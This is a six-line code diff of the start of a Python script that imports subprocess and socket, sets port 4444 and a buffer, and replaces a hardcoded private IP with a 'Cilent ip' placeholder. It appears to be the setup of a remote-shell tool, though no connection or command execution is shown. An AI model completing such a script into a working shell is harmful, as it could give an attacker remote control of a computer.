@@ -1,6 +1,6 @@
 import subprocess
 import socket
-host = "192.168.1.12"
+host = "Cilent ip"
 port = 4444
 buf = 1024
 s = socket.socket()
